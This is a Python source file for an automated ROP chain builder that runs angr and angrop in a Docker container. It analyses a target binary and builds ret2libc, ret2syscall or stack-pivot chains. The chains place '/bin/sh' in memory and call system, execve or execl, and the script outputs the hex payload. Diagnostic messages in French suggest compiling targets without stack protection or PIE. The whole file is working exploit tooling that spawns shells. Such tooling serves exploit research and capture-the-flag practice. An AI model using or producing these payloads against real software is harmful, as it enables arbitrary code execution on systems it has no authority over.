"""ROP chain builder — runs inside the angr Docker container.

Usage:
    python3 /opt/pof/rop_build.py --binary /input/target.elf --goal ret2libc_x64
"""

from __future__ import annotations

import argparse
import json

VALID_GOALS = {"ret2libc_x64", "ret2syscall_x64", "stack_pivot"}

_EMPTY: dict = {
    "ok": False,
    "goal": "",
    "arch": "",
    "binary_type": "",
    "chain": [],
    "payload_hex": "",
    "notes": "",
    "confidence": "none",
    "error": "",
}


def _out(**kwargs) -> None:
    print(json.dumps({**_EMPTY, **kwargs}), flush=True)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--goal", required=True)
    args = parser.parse_args()

    if args.goal not in VALID_GOALS:
        _out(goal=args.goal, error=f"Unknown goal: {args.goal}")
        return

    try:
        import angr
        import angrop  # noqa: F401 — registers analyses.ROP plugin
    except ImportError as exc:
        _out(goal=args.goal, error=f"angr/angrop not installed in container: {exc}")
        return

    try:
        proj = angr.Project(args.binary, auto_load_libs=False)
        # Some ELF binaries have no OS tag (stripped / musl / custom toolchain).
        # angrop's execve() requires "unix" in os — patch it when absent.
        if "unix" not in proj.loader.main_object.os.lower():
            proj.loader.main_object.os = "UNIX - System V"
        rop = proj.analyses.ROP()
        rop.find_gadgets()
    except Exception as exc:
        _out(goal=args.goal, error=f"angr load failed: {exc}")
        return

    # Binary metadata for richer diagnostics
    _arch = getattr(proj.arch, "name", "unknown")
    _os = getattr(proj.loader.main_object, "os", "unknown")
    _binary_type = type(proj.loader.main_object).__name__  # ELF, MachO, PE…

    _SHELL_PAYLOAD = b"/bin/sh\x00"

    def _resolve_plt(name: str) -> int | None:
        plt = getattr(proj.loader.main_object, "plt", {})
        # Try bare name, then macOS underscore prefix (_system, _execve…)
        for candidate in (name, f"_{name}"):
            if candidate in plt:
                return plt[candidate]
        for candidate in (name, f"_{name}"):
            sym = proj.loader.main_object.get_symbol(candidate)
            if isinstance(sym, list):
                sym = sym[0] if sym else None
            if sym is not None:
                return sym.rebased_addr
        return None

    def _find_writable_addr() -> int | None:
        for seg in proj.loader.main_object.segments:
            if seg.is_writable and seg.memsize >= len(_SHELL_PAYLOAD):
                return seg.min_addr
        return None

    def _get_binsh_chain():
        """Return (binsh_addr, optional_write_chain) or (None, reason_str)."""
        addrs = list(proj.loader.memory.find(_SHELL_PAYLOAD))
        if addrs:
            return addrs[0], None
        writable = _find_writable_addr()
        if writable is None:
            return None, "no writable segment found"
        try:
            write_chain = cb.write_to_mem(writable, _SHELL_PAYLOAD)
            return writable, write_chain
        except Exception as e:
            return None, f"write_to_mem failed ({e})"

    def _diag() -> str:
        plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
        n_write = sum(1 for g in rop.rop_gadgets if g.mem_writes)
        return (
            f"{len(rop.rop_gadgets)} gadgets, {n_write} mem-write gadgets, "
            f"PLT: {plt[:8]}"
        )

    def _try_shell_chain():
        binsh, binsh_info = _get_binsh_chain()
        tried = []
        for fname, build_args in [
            ("system", lambda sh: [sh]),
            ("execve", lambda sh: [sh, 0, 0]),
            ("execl", lambda sh: [sh, sh, 0]),
        ]:
            addr = _resolve_plt(fname)
            if addr is None:
                continue
            if binsh is None:
                tried.append(f"{fname}: {binsh_info}")
                continue
            try:
                call_chain = cb.func_call(addr, build_args(binsh))
                write_chain = binsh_info if hasattr(binsh_info, "payload_str") else None
                return (
                    (write_chain + call_chain)
                    if write_chain is not None
                    else call_chain
                )
            except Exception as e:
                tried.append(f"{fname}: {e}")
        diag = _diag()
        reason = "; ".join(tried) if tried else "none found in PLT"
        raise Exception(f"No shell function worked. {reason} — {diag}")

    # Pre-check: angrop needs at least one controllable argument register.
    # On macOS Mach-O or heavily optimised binaries, only rbp may be poppable.
    ARG_REGS = {"rdi", "rsi", "rdx", "rcx", "r8", "r9"}
    popped = {r for g in rop.rop_gadgets for r in g.popped_regs}
    moved_to = {mv.to_reg for g in rop.rop_gadgets for mv in g.reg_moves}
    controllable_args = ARG_REGS & (popped | moved_to)

    if not controllable_args and args.goal != "stack_pivot":
        raw_gadgets = [{"addr": hex(g.addr), "gadget": str(g)} for g in rop.rop_gadgets]
        plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
        shell_fns = [
            f
            for f in ("system", "execve", "execl")
            if any(p in plt for p in (f, f"_{f}"))
        ]
        n_write = sum(1 for g in rop.rop_gadgets if g.mem_writes)
        why = (
            f"Aucun gadget 'pop rdi/rsi/rdx/rcx' trouvé — seuls {sorted(popped)} "
            f"sont contrôlables. Impossible de passer des arguments à une fonction."
        )
        hint = ""
        if _binary_type == "MachO":
            hint = (
                " Ce binaire est un Mach-O macOS : les binaires macOS ont rarement "
                "ces gadgets. Testez avec un ELF Linux compilé avec "
                "-fno-stack-protector -no-pie sur Ubuntu ≤ 22.04 (glibc ≤ 2.35)."
            )
        elif not shell_fns:
            hint = (
                " Aucune fonction shell (system/execve) dans le PLT. "
                "Recompilez en liant explicitement libc ou utilisez un binaire plus grand."
            )
        else:
            hint = (
                f" Fonctions shell disponibles dans le PLT : {shell_fns}. "
                "Mais sans 'pop rdi', impossible de leur passer l'argument. "
                "Utilisez un binaire compilé avec gcc ≤ 12 / glibc ≤ 2.33 qui "
                "inclut __libc_csu_init (source classique du gadget pop rdi; ret)."
            )
        _out(
            goal=args.goal,
            arch=_arch,
            binary_type=_binary_type,
            chain=raw_gadgets,
            error=why + hint,
            notes=(
                f"{len(raw_gadgets)} gadgets bruts retournés "
                f"({n_write} avec écriture mémoire). "
                f"PLT ({len(plt)} entrées) : {plt[:12]}{'…' if len(plt) > 12 else ''}."
            ),
        )
        return

    cb = rop.chain_builder
    try:
        if args.goal == "ret2libc_x64":
            if rop.syscall_gadgets:
                chain = cb.execve()
            else:
                chain = _try_shell_chain()
        elif args.goal == "ret2syscall_x64":
            if rop.syscall_gadgets:
                chain = cb.execve()
            else:
                chain = _try_shell_chain()
        else:
            chain = cb.pivot(0x0)
    except Exception as exc:
        # Partial result: return available gadgets even when chain fails.
        raw_gadgets = [{"addr": hex(g.addr), "gadget": str(g)} for g in rop.rop_gadgets]
        plt = sorted(getattr(proj.loader.main_object, "plt", {}).keys())
        _out(
            goal=args.goal,
            arch=_arch,
            binary_type=_binary_type,
            chain=raw_gadgets,
            error=str(exc),
            notes=(
                f"Chain could not be built automatically — "
                f"{len(raw_gadgets)} raw gadgets returned. "
                f"PLT: {plt}"
            ),
        )
        return

    try:
        payload = chain.payload_str()
        payload_hex = payload.hex() if isinstance(payload, bytes) else ""
        gadgets = [
            {"addr": hex(g.addr) if hasattr(g, "addr") else "?", "gadget": str(g)}
            for g in getattr(chain, "_gadgets", [])
        ]
        _out(
            ok=True,
            goal=args.goal,
            arch=_arch,
            binary_type=_binary_type,
            chain=gadgets,
            payload_hex=payload_hex,
            confidence="high" if gadgets else "low",
            notes=f"Built via angr Docker ({len(gadgets)} gadgets)",
        )
    except Exception as exc:
        _out(goal=args.goal, error=f"Payload serialization failed: {exc}")


if __name__ == "__main__":
    main()
